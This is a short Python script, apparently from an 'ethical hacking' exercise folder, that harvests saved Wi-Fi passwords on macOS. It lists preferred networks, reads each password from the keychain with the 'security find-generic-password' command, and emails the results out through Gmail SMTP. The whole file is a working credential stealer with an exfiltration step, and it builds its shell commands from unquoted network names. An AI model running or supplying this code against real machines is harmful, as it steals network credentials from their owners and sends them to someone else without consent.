#Desktop/Ethical\ Hacking/

import subprocess, smtplib

def sendMail(email,password,content):
    server = smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,content)
    server.quit()


command = "networksetup -listpreferredwirelessnetworks en0"
result = subprocess.check_output(command,encoding='utf-8',shell=True)

network_names_list = result.split("\n\t")
network_names_list.pop(0)
print(str(network_names_list))

result = "Here are your results: \n\n"

for i in range(0, len(network_names_list)):
    network_name = network_names_list[i]
    print(network_name)
    command = "security find-generic-password -wa " + network_name
    try: 
        currentResult = "Wifi network " +str(i+1)+ ": "+ str(network_name) + "\n\tPassword: " + subprocess.check_output(command,stderr=subprocess.STDOUT,encoding = 'utf-8', shell=True) +"\n"
    except subprocess.CalledProcessError as error:
        print(str(error.output))
        currentResult = "Error (probably coudn't find)\n"
    result = result + currentResult

print("\n\n\n\n" + result)
sendMail(enterEmail,enterPassword,result)
